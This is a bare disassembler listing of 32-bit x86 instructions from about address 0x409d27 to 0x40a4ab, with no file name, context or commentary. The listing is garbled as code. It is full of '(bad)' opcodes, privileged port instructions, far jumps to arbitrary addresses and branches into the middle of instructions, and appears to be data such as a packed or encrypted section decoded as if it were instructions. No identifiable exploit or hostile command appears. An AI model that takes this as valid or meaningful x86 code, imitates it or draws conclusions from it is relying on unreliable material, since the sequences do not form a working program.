  409d27:	jle    0x409d7a
  409d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d2a:	push   es
  409d2b:	cld    
  409d2c:	jnp    0x409d72
  409d2e:	call   0xcb8f:0x3864b547
  409d35:	add    al,0xbb
  409d37:	(bad)  
  409d38:	push   ebx
  409d39:	sub    cl,BYTE PTR [esi]
  409d3b:	pop    ss
  409d3c:	test   BYTE PTR [ecx],dh
  409d3e:	dec    esp
  409d3f:	aad    0x2
  409d41:	mov    ah,0x59
  409d43:	inc    ebp
  409d44:	jle    0x409cc8
  409d46:	call   0xd552881b
  409d4b:	leave  
  409d4c:	addr16 leave 
  409d4e:	mov    eax,ds:0x10a49e17
  409d53:	jg     0x409dbb
  409d55:	aaa    
  409d56:	mov    dl,0xde
  409d58:	sbb    ebp,eax
  409d5a:	sub    al,0xa4
  409d5c:	imul   DWORD PTR [edi+0x2e]
  409d5f:	scas   eax,DWORD PTR es:[edi]
  409d60:	pop    es
  409d61:	pop    esp
  409d62:	fnstenv [ecx-0x56869d66]
  409d68:	inc    ebx
  409d69:	and    bh,BYTE PTR [ebp-0x55]
  409d6c:	add    cl,BYTE PTR [edi-0x686fbf59]
  409d72:	outs   dx,DWORD PTR ds:[esi]
  409d73:	mov    edx,0x4f8cbfec
  409d78:	enter  0x3cb2,0x90
  409d7c:	adc    esp,DWORD PTR [edi+0x25677cdd]
  409d82:	out    dx,al
  409d83:	int    0xb0
  409d85:	sar    DWORD PTR [eax+0x1228b177],cl
  409d8b:	je     0x409d8b
  409d8d:	test   BYTE PTR [ecx-0x73879709],ah
  409d93:	and    ecx,edx
  409d95:	lock repz retf 0x934b
  409d9a:	je     0x409d91
  409d9c:	jns    0x409de5
  409d9e:	pop    edx
  409d9f:	cmp    ebx,ebp
  409da1:	ror    DWORD PTR [edi],cl
  409da3:	mov    cl,0x9f
  409da5:	mov    BYTE PTR [ebx-0x14],dl
  409da8:	fs icebp 
  409daa:	in     eax,dx
  409dab:	retf   
  409dac:	in     al,dx
  409dad:	cmp    al,0xe4
  409daf:	sti    
  409db0:	mov    dl,dh
  409db2:	lea    esi,ss:[esi]
  409db5:	mov    eax,ds:0x6c7904fa
  409dba:	sbb    dl,bl
  409dbc:	or     eax,0x9afc34cd
  409dc1:	and    esi,DWORD PTR [ebx+eax*2-0x22ba185c]
  409dc8:	mov    DWORD PTR [eax-0x46],esi
  409dcb:	pop    edi
  409dcc:	sub    ebp,edi
  409dce:	add    DWORD PTR [ebp+0x4b],0xfffffffc
  409dd2:	pop    ebp
  409dd3:	inc    eax
  409dd4:	jnp    0x409d5a
  409dd6:	(bad)  
  409dd8:	nop
  409dd9:	fwait
  409dda:	cwde   
  409ddb:	adc    BYTE PTR [edx-0x51],bh
  409dde:	add    ecx,DWORD PTR [ecx+0x49a105d8]
  409de4:	fistp  QWORD PTR [esi+ebp*8]
  409de7:	stos   BYTE PTR es:[edi],al
  409de8:	xor    bl,ah
  409dea:	pop    esi
  409deb:	pop    edx
  409dec:	scas   eax,DWORD PTR es:[edi]
  409ded:	mov    ebx,0x5205b241
  409df2:	outs   dx,DWORD PTR ds:[esi]
  409df3:	(bad)  
  409df5:	jp     0x409e1e
  409df7:	cmp    bl,ch
  409df9:	jecxz  0x409e28
  409dfb:	(bad)  
  409dfc:	adc    DWORD PTR [esi],edi
  409dfe:	cs stos BYTE PTR es:[edi],al
  409e00:	or     DWORD PTR [edx-0x456ebeec],edx
  409e06:	push   ds
  409e07:	pusha  
  409e08:	adc    eax,0x96ce4fb5
  409e0d:	push   ebp
  409e0e:	out    0x60,eax
  409e10:	(bad)  
  409e11:	lods   al,BYTE PTR ds:[esi]
  409e12:	xchg   ebp,eax
  409e13:	out    dx,al
  409e14:	mov    al,ds:0x65127670
  409e19:	int    0x83
  409e1b:	ja     0x409e0f
  409e1d:	sbb    BYTE PTR [ecx-0x6b],cl
  409e20:	or     ah,BYTE PTR [ebp-0x2242a4e5]
  409e26:	popa   
  409e27:	das    
  409e28:	xchg   esp,ebp
  409e2a:	aas    
  409e2b:	popf   
  409e2c:	jg     0x409db0
  409e2e:	stc    
  409e2f:	jp     0x409e03
  409e31:	enter  0x13fd,0xf0
  409e35:	int3   
  409e36:	pop    ebx
  409e37:	or     BYTE PTR [edi-0x2e0d22bc],ah
  409e3d:	(bad)
  409e40:	push   ebp
  409e41:	(bad)  
  409e42:	fild   WORD PTR [edi+ecx*2]
  409e45:	adc    dh,dl
  409e47:	stos   BYTE PTR es:[edi],al
  409e48:	(bad)  
  409e49:	clc    
  409e4a:	loopne 0x409e9d
  409e4c:	outs   dx,DWORD PTR ds:[esi]
  409e4d:	sbb    bh,BYTE PTR [edi-0x58]
  409e50:	test   al,0xb9
  409e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e53:	xchg   esp,eax
  409e54:	out    0x80,eax
  409e56:	fisubr DWORD PTR [ebx]
  409e58:	sti    
  409e59:	imul   esi,DWORD PTR [esi-0x66b1e78d],0x5f
  409e60:	jo     0x409e91
  409e62:	jnp    0x409e89
  409e64:	rol    DWORD PTR [esi-0x1f],cl
  409e67:	mov    ebx,0x8a1f6b6
  409e6c:	ret    
  409e6d:	test   eax,0x68009482
  409e72:	lea    ecx,[ecx]
  409e74:	pop    ecx
  409e75:	scas   eax,DWORD PTR es:[edi]
  409e76:	test   eax,0x23f4db5
  409e7b:	mov    DWORD PTR [edx],0xcae24a16
  409e81:	ror    dl,cl
  409e83:	sub    ebp,edx
  409e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e86:	in     eax,0x4b
  409e88:	mov    dh,0x3f
  409e8a:	pop    ds
  409e8b:	rcl    al,1
  409e8d:	scas   al,BYTE PTR es:[edi]
  409e8e:	lods   eax,DWORD PTR ds:[esi]
  409e8f:	mov    ebp,DWORD PTR [ebp+0x49]
  409e92:	cli    
  409e93:	and    BYTE PTR [edi+0x73],ah
  409e96:	ds sub ah,ah
  409e99:	rcpps  xmm3,XMMWORD PTR [ebx]
  409e9c:	dec    BYTE PTR [eax+0x6773609e]
  409ea2:	mov    BYTE PTR [eax+0x4a],dl
  409ea5:	rol    DWORD PTR [ecx+0x30],0x64
  409ea9:	fbld   TBYTE PTR [edx]
  409eab:	call   0x5523d439
  409eb0:	es (bad) 
  409eb2:	jp     0x409ed7
  409eb4:	arpl   WORD PTR [eax+ebx*4+0x500eb11a],dx
  409ebb:	dec    ebx
  409ebc:	ja     0x409f13
  409ebe:	mov    dl,BYTE PTR [eax]
  409ec0:	adc    eax,0x338ff362
  409ec5:	retf   
  409ec6:	and    al,0x23
  409ec8:	push   esp
  409ec9:	xor    eax,0xc6ad59f2
  409ece:	mov    ah,0xae
  409ed0:	and    DWORD PTR [ecx+0x64],esp
  409ed3:	mov    edi,0x7ef21d7d
  409ed8:	repz icebp 
  409eda:	jp     0x409ea0
  409edc:	push   ds
  409edd:	mov    ds:0xf88f5033,al
  409ee2:	cmp    eax,0x9ca2fc7f
  409ee7:	inc    ebp
  409ee8:	loope  0x409f45
  409eea:	mov    al,ds:0xdbe8f6bc
  409eef:	fnsave [esi+0x546b8b09]
  409ef5:	jns    0x409f38
  409ef7:	cli    
  409ef8:	xor    eax,0xeefe6a83
  409efd:	sar    BYTE PTR [edx+0x20],cl
  409f00:	call   0xd7077837
  409f05:	inc    edi
  409f06:	ror    DWORD PTR [edx+eiz*1-0x1b],cl
  409f0a:	rcl    BYTE PTR [ebp-0xa],1
  409f0d:	add    edi,DWORD PTR [edi+eiz*4-0x6e]
  409f11:	jg     0x409f40
  409f13:	sbb    DWORD PTR cs:[eax-0x4dd9794c],eax
  409f1a:	cmp    edx,esi
  409f1c:	jmp    0x7451:0xacef96db
  409f23:	xchg   esi,eax
  409f24:	inc    ecx
  409f25:	mov    DWORD PTR [ebx-0x3f470dad],esp
  409f2b:	data16 mov ch,0x80
  409f2e:	cdq    
  409f2f:	xchg   edx,eax
  409f30:	lods   eax,DWORD PTR ds:[esi]
  409f31:	sub    eax,0x812a17b9
  409f36:	lock jnp 0x409f86
  409f39:	inc    ebp
  409f3a:	enter  0xef22,0x2f
  409f3e:	les    edx,FWORD PTR [ebx]
  409f40:	xor    eax,0xd497d4bb
  409f45:	mov    esi,0x59453270
  409f4a:	push   esp
  409f4b:	sbb    edx,DWORD PTR [esi]
  409f4d:	dec    edi
  409f4e:	scas   al,BYTE PTR es:[edi]
  409f4f:	push   ds
  409f50:	popa   
  409f51:	pop    eax
  409f52:	clc    
  409f53:	sar    BYTE PTR [esp+edi*1-0x66361179],0x2c
  409f5b:	fstp   TBYTE PTR [ebx]
  409f5d:	rcr    dh,0xb4
  409f60:	mov    es,WORD PTR [ebp-0x514de6b5]
  409f66:	jmp    0x9943dd94
  409f6b:	inc    edi
  409f6c:	test   al,0x58
  409f6e:	jns    0x409fde
  409f70:	xor    al,BYTE PTR [edi-0x7f0e4f02]
  409f76:	ret    0x42fc
  409f79:	and    BYTE PTR [edx-0x37],al
  409f7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f7e:	jp     0x409fb2
  409f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f81:	and    ah,BYTE PTR [edx]
  409f83:	and    ah,BYTE PTR [esi+0x2f]
  409f86:	jae    0x409f6c
  409f88:	call   0xaae0b5f4
  409f8d:	mov    DWORD PTR [ebp-0x5918b6fc],esi
  409f93:	scas   al,BYTE PTR es:[edi]
  409f94:	mov    ds:0xbd71805e,al
  409f99:	adc    eax,0xbdb1dddf
  409f9e:	(bad)  
  409f9f:	pop    ss
  409fa0:	jnp    0x409f45
  409fa2:	ret    
  409fa3:	bound  ebp,QWORD PTR [eax+0x70359c02]
  409fa9:	jl     0x409f52
  409fab:	dec    esi
  409fac:	adc    eax,0xb92c46ff
  409fb1:	dec    esp
  409fb2:	or     bh,bl
  409fb4:	addr16 jbe 0x409ff0
  409fb7:	les    edi,FWORD PTR [eax]
  409fb9:	sti    
  409fba:	repnz neg DWORD PTR [edx]
  409fbd:	aad    0xe8
  409fbf:	enter  0x96f0,0xc9
  409fc3:	jp     0x409ff7
  409fc5:	xor    BYTE PTR [ebx-0x62d9a786],0xc2
  409fcc:	pop    esi
  409fcd:	mov    edi,0x84845107
  409fd2:	lahf   
  409fd3:	and    BYTE PTR [edx-0x7c],ch
  409fd6:	(bad)  [edx]
  409fd8:	mov    dh,0x6a
  409fda:	push   ss
  409fdb:	mov    al,0x4e
  409fdd:	ret    
  409fde:	xchg   BYTE PTR [eax+0x3b9064f8],bl
  409fe4:	pop    ecx
  409fe5:	and    DWORD PTR [esi],edx
  409fe7:	lods   al,BYTE PTR ds:[esi]
  409fe8:	sti    
  409fe9:	pop    ebp
  409fea:	add    esi,edx
  409fec:	add    esp,esi
  409fee:	sbb    DWORD PTR [ebp-0x52a02615],ebp
  409ff4:	loope  0x40a046
  409ff6:	push   esp
  409ff7:	lea    ebp,[ebx]
  409ff9:	aaa    
  409ffa:	add    ecx,DWORD PTR [ebp+0xa0b44fc]
  40a000:	mov    dh,0xe3
  40a002:	loope  0x40a065
  40a004:	push   edi
  40a005:	test   eax,0xb8101392
  40a00a:	lahf   
  40a00b:	cmp    eax,0x5dfebaf
  40a010:	retf   0xa45c
  40a013:	fst    QWORD PTR [eax]
  40a016:	lods   al,BYTE PTR ds:[esi]
  40a017:	imul   edi
  40a019:	cmp    esp,DWORD PTR [edi]
  40a01b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a01c:	repz loop 0x40a09e
  40a01f:	fs mov ah,0x9e
  40a022:	inc    edx
  40a023:	ins    BYTE PTR es:[edi],dx
  40a024:	mov    bh,0xf2
  40a026:	lds    ebp,FWORD PTR [edi*1+0x41fb75ef]
  40a02d:	jo     0x409ff3
  40a02f:	sub    DWORD PTR [ebx+0x1c8c835d],eax
  40a035:	popf   
  40a036:	push   ecx
  40a037:	hlt    
  40a038:	fstp   TBYTE PTR [edi+0x5c]
  40a03b:	sbb    eax,ecx
  40a03d:	sbb    DWORD PTR [edx+0x5],ebx
  40a040:	inc    ebp
  40a041:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a042:	cmp    BYTE PTR [eax],cl
  40a044:	dec    ebp
  40a045:	xchg   DWORD PTR [ebp+ecx*8-0x36],ebp
  40a049:	into   
  40a04a:	or     eax,0xfe131fc2
  40a04f:	loop   0x40a040
  40a051:	jmp    0x40a017
  40a053:	out    dx,al
  40a054:	stos   BYTE PTR es:[edi],al
  40a055:	xchg   ebx,eax
  40a056:	cmp    eax,0xa92eb753
  40a05b:	lds    ebx,FWORD PTR [esi+0x53317632]
  40a061:	lea    ebx,[esi-0x80]
  40a064:	gs xchg ebx,eax
  40a066:	cdq    
  40a067:	and    BYTE PTR [eax-0x1da3a44f],ah
  40a06d:	xchg   ecx,eax
  40a06e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a06f:	retf   0x461
  40a072:	sbb    BYTE PTR [edi+0x4f],dl
  40a075:	mov    esp,0x8edb3b6b
  40a07a:	cmc    
  40a07b:	mov    edi,0x8a8af050
  40a080:	lds    ebx,FWORD PTR [eax]
  40a082:	jmp    0xba187eb1
  40a087:	or     dh,0xa1
  40a08a:	mov    ebp,0x258e7805
  40a08f:	shr    DWORD PTR [ebx+esi*1-0x7b],1
  40a093:	push   eax
  40a094:	outs   dx,DWORD PTR ds:[esi]
  40a095:	lds    esp,FWORD PTR [esi+ebp*8+0x79]
  40a099:	adc    edx,DWORD PTR [eax-0x6c]
  40a09c:	mov    eax,ds:0x9e51caf4
  40a0a1:	xor    al,0xc8
  40a0a3:	iret   
  40a0a4:	es push 0xffffff94
  40a0a7:	push   0xffffffa1
  40a0a9:	mov    ebx,0x59e187db
  40a0ae:	ror    BYTE PTR [esi],1
  40a0b0:	push   0xca773fb8
  40a0b5:	mov    ah,0x9a
  40a0b7:	add    BYTE PTR [ebx],dh
  40a0b9:	int3   
  40a0ba:	out    0x1f,al
  40a0bc:	mov    ah,BYTE PTR [esi-0xf6b59b9]
  40a0c2:	xor    edx,0x29
  40a0c5:	stos   BYTE PTR es:[edi],al
  40a0c6:	ins    DWORD PTR es:[edi],dx
  40a0c7:	xor    DWORD PTR [edi-0x7cb34394],esp
  40a0cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a0ce:	or     BYTE PTR [edi-0x601465b7],0x76
  40a0d5:	push   esp
  40a0d6:	repnz fadd st(3),st
  40a0d9:	push   edi
  40a0da:	dec    ecx
  40a0db:	xor    eax,0xb576c471
  40a0e0:	shr    ch,cl
  40a0e2:	fimul  DWORD PTR [ebx]
  40a0e4:	pop    esi
  40a0e5:	sbb    ecx,DWORD PTR [ebp+0x6a]
  40a0e8:	hlt    
  40a0e9:	jo     0x40a0c3
  40a0eb:	pop    ss
  40a0ec:	sub    eax,0xb4a83e4d
  40a0f1:	xchg   DWORD PTR [ecx+edi*1-0x1a],ecx
  40a0f5:	jnp    0x40a0e2
  40a0f7:	into   
  40a0f8:	dec    ebx
  40a0f9:	ja     0x40a172
  40a0fb:	fs add al,0x2d
  40a0fe:	or     BYTE PTR [esi+0x32cc17de],ah
  40a104:	mov    edx,0xa30aeb92
  40a109:	lahf   
  40a10a:	jmp    0x6252e864
  40a10f:	inc    esp
  40a110:	je     0x40a130
  40a112:	sbb    eax,0xff0f8902
  40a117:	push   esi
  40a118:	or     ch,bl
  40a11a:	cdq    
  40a11b:	int    0x3
  40a11d:	out    0x29,al
  40a11f:	popa   
  40a120:	push   ds
  40a121:	inc    esp
  40a122:	in     al,0x17
  40a124:	or     esp,edx
  40a126:	ret    0x4acf
  40a129:	sti    
  40a12a:	inc    ebx
  40a12b:	pushf  
  40a12c:	cmp    al,al
  40a12e:	es inc ecx
  40a130:	out    0x18,eax
  40a132:	mov    ebp,0x736b5b24
  40a137:	and    al,0x61
  40a139:	aas    
  40a13a:	jbe    0x40a127
  40a13c:	in     al,dx
  40a13d:	dec    ebx
  40a13e:	test   DWORD PTR [esi+0x6f],0xee454c9c
  40a145:	push   cs
  40a146:	dec    esp
  40a147:	dec    ebx
  40a148:	in     al,0xdc
  40a14a:	and    cl,al
  40a14c:	jb     0x40a0d0
  40a14e:	jmp    0x40a191
  40a150:	sub    DWORD PTR [eax+0x4ffe173],ebp
  40a156:	dec    eax
  40a157:	pop    es
  40a158:	mov    ecx,0x19a8dc88
  40a15d:	cmp    eax,0x3d375d5f
  40a162:	leave  
  40a163:	aad    0xde
  40a165:	or     ah,cl
  40a167:	shl    edi,1
  40a169:	cs out dx,eax
  40a16b:	gs hlt 
  40a16d:	mov    ch,ah
  40a16f:	mov    ebp,0xc90eab87
  40a174:	(bad)  
  40a175:	mov    bh,0x73
  40a177:	aad    0x9
  40a179:	fimul  WORD PTR [ecx-0x7]
  40a17c:	(bad)  
  40a17d:	cmc    
  40a17e:	rcr    DWORD PTR [edi-0x6a],cl
  40a181:	loopne 0x40a1e3
  40a183:	out    0xd,al
  40a185:	stc    
  40a186:	call   0x3d03:0x8cff8b27
  40a18d:	ret    0x59a2
  40a190:	xchg   ebp,eax
  40a191:	mov    ds:0x1bf88bee,al
  40a196:	adc    DWORD PTR [esi],ebp
  40a198:	and    BYTE PTR ds:[eax+0x34],al
  40a19c:	(bad)  
  40a19d:	mov    esp,0xe16686f7
  40a1a2:	mov    eax,0xf8807164
  40a1a7:	jmp    0x19fc2599
  40a1ac:	rcr    DWORD PTR [esi-0x2a8854a7],1
  40a1b2:	mov    WORD PTR [edx],cs
  40a1b4:	mov    al,bh
  40a1b6:	sub    BYTE PTR [esi-0x2c],al
  40a1b9:	retf   
  40a1ba:	loop   0x40a1c4
  40a1bc:	pop    ebp
  40a1bd:	and    DWORD PTR [ecx],ebp
  40a1bf:	or     esi,0xffffffd9
  40a1c2:	pop    edx
  40a1c3:	jo     0x40a189
  40a1c5:	mov    dh,0x78
  40a1c7:	or     ebx,DWORD PTR [edx+0x37575c27]
  40a1cd:	(bad)  
  40a1ce:	cmp    al,0x69
  40a1d0:	js     0x40a24f
  40a1d2:	jns    0x40a158
  40a1d4:	int    0x4e
  40a1d6:	push   0x8
  40a1d8:	jecxz  0x40a1dc
  40a1da:	fdivr  st(5),st
  40a1dc:	test   DWORD PTR [esp+ecx*1],eax
  40a1df:	fcom   QWORD PTR [ebp+edx*8+0x76cb3479]
  40a1e6:	mov    esp,0x1b99cc31
  40a1eb:	dec    ebp
  40a1ec:	adc    BYTE PTR [edx],dl
  40a1ee:	pop    ecx
  40a1ef:	jle    0x40a269
  40a1f1:	fiadd  DWORD PTR [edi-0x386444f5]
  40a1f7:	jno    0x40a218
  40a1f9:	outs   dx,DWORD PTR ds:[esi]
  40a1fa:	mov    edi,0x62c20fad
  40a1ff:	jo     0x40a1f0
  40a201:	xchg   ebp,eax
  40a202:	sti    
  40a203:	dec    ebp
  40a204:	ins    BYTE PTR es:[edi],dx
  40a205:	push   ebx
  40a206:	bound  ebx,QWORD PTR cs:[esp+eax*1]
  40a20a:	ja     0x40a1cc
  40a20c:	fisubr WORD PTR [ecx-0x57]
  40a20f:	push   edi
  40a210:	inc    ecx
  40a211:	and    BYTE PTR [edx+0x520f33ec],bl
  40a217:	mov    edx,0xbc035640
  40a21c:	sti    
  40a21d:	jg     0x40a24a
  40a21f:	xchg   ebx,eax
  40a220:	dec    ecx
  40a221:	cdq    
  40a222:	lahf   
  40a223:	pop    edi
  40a224:	iret   
  40a225:	dec    eax
  40a226:	ficomp DWORD PTR [esi+0x1fcc5bfd]
  40a22c:	mov    esi,0x82ea3f2d
  40a231:	jns    0x40a257
  40a233:	daa    
  40a234:	sbb    BYTE PTR [ecx-0x4f],0xe8
  40a238:	inc    edx
  40a239:	sub    ebp,ebx
  40a23b:	int3   
  40a23c:	dec    edi
  40a23d:	clc    
  40a23e:	mov    esp,0xa9a3b09e
  40a243:	inc    ebp
  40a244:	rcr    dl,0x4
  40a247:	arpl   WORD PTR [edi],bx
  40a249:	push   edi
  40a24a:	push   ss
  40a24b:	stc    
  40a24c:	clc    
  40a24d:	or     al,0xfb
  40a24f:	lock mov bh,0xac
  40a252:	sub    esp,DWORD PTR [edx+ebp*4]
  40a255:	and    bl,BYTE PTR [ebx+0x9e85642]
  40a25b:	fdivr  QWORD PTR [ebx+0x19]
  40a25e:	cld    
  40a25f:	out    dx,al
  40a260:	mov    esp,0xd064000d
  40a265:	ja     0x40a2b4
  40a267:	dec    edi
  40a268:	loopne 0x40a23a
  40a26a:	mov    eax,0xac8678af
  40a26f:	xchg   ecx,eax
  40a270:	jl     0x40a295
  40a272:	(bad)  
  40a273:	rcr    DWORD PTR [ebp-0x5b],0x4f
  40a277:	add    BYTE PTR [eax-0x5a],dh
  40a27a:	sub    DWORD PTR [ebp+ebp*8+0x75],ebx
  40a27e:	cld    
  40a27f:	out    dx,eax
  40a280:	loopne 0x40a297
  40a282:	nop    DWORD PTR [ebp+0x25]
  40a286:	es pushf 
  40a288:	xlat   BYTE PTR ds:[ebx]
  40a289:	sti    
  40a28a:	inc    edi
  40a28b:	mov    edx,0x777db6dd
  40a290:	dec    ebp
  40a291:	das    
  40a292:	mov    al,bh
  40a294:	pop    edx
  40a295:	add    DWORD PTR [ecx+0x15],ebp
  40a298:	ret    0xc3eb
  40a29b:	int    0xb9
  40a29d:	xor    BYTE PTR [eax+0x26a8ce9a],dl
  40a2a3:	xchg   edi,eax
  40a2a4:	sub    eax,0x6f792e84
  40a2a9:	(bad)
  40a2ad:	adc    BYTE PTR [edi+0x7ae0e3ca],cl
  40a2b3:	fild   WORD PTR [eax-0x62f12bc7]
  40a2b9:	test   DWORD PTR [edx+0x55],esp
  40a2bc:	mov    DWORD PTR [edi+eax*2-0x6b5df5c7],esp
  40a2c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2c4:	push   ds
  40a2c5:	pcmpgtb mm6,QWORD PTR [ebp+0x2f]
  40a2c9:	ret    
  40a2ca:	sbb    ebp,DWORD PTR [eax+ecx*4]
  40a2cd:	inc    eax
  40a2ce:	push   esp
  40a2cf:	push   es
  40a2d0:	push   0xf16c0f79
  40a2d5:	stos   BYTE PTR es:[edi],al
  40a2d6:	aam    0xf3
  40a2d8:	pop    es
  40a2d9:	mov    BYTE PTR [esi+0x52],ch
  40a2dc:	lods   al,BYTE PTR ds:[esi]
  40a2dd:	loop   0x40a27b
  40a2df:	and    edx,ebp
  40a2e1:	mov    eax,0x79241b08
  40a2e6:	jl     0x40a32d
  40a2e8:	and    esp,DWORD PTR [ecx]
  40a2ea:	and    al,0xe2
  40a2ec:	add    al,ah
  40a2ee:	sahf   
  40a2ef:	inc    esp
  40a2f0:	mov    cl,0xcc
  40a2f2:	push   es
  40a2f3:	pop    ss
  40a2f4:	jmp    0x40a2b9
  40a2f6:	(bad)  
  40a2f7:	xchg   ebp,eax
  40a2f8:	in     al,dx
  40a2f9:	ret    
  40a2fa:	in     al,dx
  40a2fb:	imul   ecx,DWORD PTR [ecx-0x66],0xbde8fc4
  40a302:	retf   
  40a303:	jecxz  0x40a35f
  40a305:	sub    bh,BYTE PTR [ecx-0x516373dc]
  40a30b:	adc    ch,dh
  40a30d:	mov    eax,0xff53be8
  40a312:	(bad)  
  40a313:	shr    BYTE PTR [eax+0x4a],1
  40a316:	xlat   BYTE PTR ds:[ebx]
  40a317:	enter  0xad49,0x53
  40a31b:	lds    ebx,FWORD PTR ds:[edx-0x6f]
  40a31f:	pop    ebx
  40a320:	cmp    eax,0xf084b5ad
  40a325:	add    BYTE PTR [eax+0x14],0xe2
  40a329:	cmp    edi,DWORD PTR [edi]
  40a32b:	cmp    eax,0x68bfb472
  40a330:	dec    esi
  40a331:	push   0x8eedeff
  40a336:	cmc    
  40a337:	stc    
  40a338:	fld    QWORD PTR [edi+0x3c]
  40a33b:	je     0x40a371
  40a33d:	inc    ebp
  40a33e:	das    
  40a33f:	mov    ah,0xea
  40a341:	mov    ah,0xc6
  40a343:	push   ebx
  40a344:	or     ah,BYTE PTR [esp+ecx*8]
  40a347:	or     al,0x73
  40a349:	outs   dx,DWORD PTR ds:[esi]
  40a34a:	jns    0x40a391
  40a34c:	adc    eax,0x79474b13
  40a351:	and    dl,BYTE PTR [edx-0x7b]
  40a354:	xor    eax,0xfe80eb03
  40a359:	int    0x5a
  40a35b:	lds    edi,FWORD PTR [eax-0x1b]
  40a35e:	sti    
  40a35f:	add    BYTE PTR [ebx],cl
  40a361:	(bad)  
  40a362:	push   ebp
  40a363:	pop    eax
  40a364:	sbb    ebp,DWORD PTR [edi+ecx*4-0x31]
  40a368:	retf   
  40a369:	push   es
  40a36a:	mov    ah,0xd3
  40a36c:	mov    ah,0x54
  40a36e:	inc    ecx
  40a36f:	pop    ds
  40a370:	mov    ds:0x6355b38b,al
  40a375:	mov    edi,0xf5fa6bd1
  40a37a:	(bad)  
  40a37b:	loope  0x40a34c
  40a37d:	popa   
  40a37e:	cld    
  40a37f:	aad    0xf6
  40a381:	popf   
  40a382:	imul   edi,DWORD PTR [ebx+esi*2-0x51927031],0xc9686517
  40a38d:	xchg   DWORD PTR [esi-0x778a243],ebx
  40a393:	sbb    eax,0x5222f078
  40a398:	cmp    al,0x63
  40a39a:	or     DWORD PTR [ebp+0x6a4de391],eax
  40a3a0:	mov    ecx,0xcf8c057c
  40a3a5:	adc    dh,ah
  40a3a7:	imul   BYTE PTR [edx]
  40a3a9:	lock add al,0x97
  40a3ac:	add    bh,BYTE PTR [ecx+0x29e30e08]
  40a3b2:	cmp    BYTE PTR [edi],bh
  40a3b4:	lods   al,BYTE PTR ds:[esi]
  40a3b5:	jge    0x40a3a3
  40a3b7:	in     al,dx
  40a3b8:	in     al,0xa4
  40a3ba:	int3   
  40a3bb:	leave  
  40a3bc:	pop    ds
  40a3bd:	dec    esp
  40a3be:	xchg   edx,eax
  40a3bf:	ret    0x1835
  40a3c2:	sub    al,0xbd
  40a3c4:	rcl    BYTE PTR [esi+0xa],cl
  40a3c7:	ror    BYTE PTR [esi+0x65],1
  40a3ca:	popa   
  40a3cb:	ja     0x40a404
  40a3cd:	adc    BYTE PTR [edx],bl
  40a3cf:	(bad)  
  40a3d0:	repnz mov ds:0x13b11889,al
  40a3d6:	lock arpl WORD PTR [ebp-0x7f],dx
  40a3da:	xor    al,BYTE PTR [edx-0x7b]
  40a3dd:	outs   dx,DWORD PTR ds:[esi]
  40a3de:	cmc    
  40a3df:	inc    esp
  40a3e0:	pushf  
  40a3e1:	cmc    
  40a3e2:	or     ecx,DWORD PTR [edi]
  40a3e4:	icebp  
  40a3e5:	mov    ch,dl
  40a3e7:	push   edx
  40a3e8:	into   
  40a3e9:	sbb    al,0x6f
  40a3eb:	daa    
  40a3ec:	ds mov bl,0xcd
  40a3ef:	dec    edx
  40a3f0:	nop
  40a3f1:	sub    al,BYTE PTR [ecx+0x2e7da734]
  40a3f7:	scas   al,BYTE PTR es:[edi]
  40a3f8:	adc    eax,0x8d1744d1
  40a3fd:	or     eax,0x6bbab251
  40a402:	mov    cs,ecx
  40a404:	push   esi
  40a405:	add    BYTE PTR [ebp-0x8fdd092],ch
  40a40b:	or     eax,0x2446c844
  40a410:	sub    al,0x4b
  40a412:	sbb    dh,BYTE PTR [esi+edi*4]
  40a415:	pop    ebp
  40a416:	cmp    eax,0x6c23b74b
  40a41b:	scas   al,BYTE PTR es:[edi]
  40a41c:	push   ss
  40a41d:	scas   eax,DWORD PTR es:[edi]
  40a41e:	test   ch,dl
  40a420:	icebp  
  40a421:	inc    ebp
  40a422:	cs xchg edi,eax
  40a424:	cmp    eax,0x6a3cca76
  40a429:	sar    DWORD PTR [ebp-0x13],0x73
  40a42d:	mov    cl,bl
  40a42f:	mov    edi,0x7ee4dbb
  40a434:	mov    dh,0x7b
  40a436:	push   ebp
  40a437:	out    0x40,eax
  40a439:	sub    BYTE PTR [edi],dl
  40a43b:	sbb    ecx,edx
  40a43d:	mov    ds:0xf5fcb554,eax
  40a442:	(bad)  
  40a443:	mov    WORD PTR [eax+esi*8-0x77a4bea5],cs
  40a44a:	xchg   DWORD PTR [eax],ecx
  40a44c:	jns    0x40a3ef
  40a44e:	(bad)  
  40a44f:	aas    
  40a450:	test   eax,0xa5780f85
  40a455:	jae    0x40a48a
  40a457:	or     esi,esp
  40a459:	stc    
  40a45a:	jl     0x40a406
  40a45c:	(bad)  
  40a45d:	in     al,0xa8
  40a45f:	sub    eax,0x82f7fe4b
  40a464:	mov    al,ds:0x334a9e4a
  40a469:	jo     0x40a45d
  40a46b:	mov    ch,0xaf
  40a46d:	mov    BYTE PTR ds:0x9562dadd,ch
  40a473:	and    BYTE PTR [esi],al
  40a475:	dec    esi
  40a476:	out    dx,al
  40a477:	add    DWORD PTR [eax],ecx
  40a479:	xchg   BYTE PTR [ecx+0x5e37bba4],cl
  40a47f:	dec    ebp
  40a480:	(bad)  
  40a481:	mov    ebp,DWORD PTR [eax+0xe1552c9]
  40a487:	inc    eax
  40a488:	push   ss
  40a489:	sti    
  40a48a:	push   ecx
  40a48b:	arpl   WORD PTR [ebp+0x53],bx
  40a48e:	rcr    DWORD PTR [edi],1
  40a490:	xchg   DWORD PTR [ebx+0x76],esp
  40a493:	daa    
  40a494:	cmp    DWORD PTR [ebx+0x4cf2bba4],esp
  40a49a:	lahf   
  40a49b:	aas    
  40a49c:	outs   dx,DWORD PTR ds:[esi]
  40a49d:	and    al,0x1e
  40a49f:	add    BYTE PTR [ebx+eiz*1-0x6605ac72],dh
  40a4a6:	mov    eax,ds:0xfe2f9a2b
  40a4ab:	(bad)  
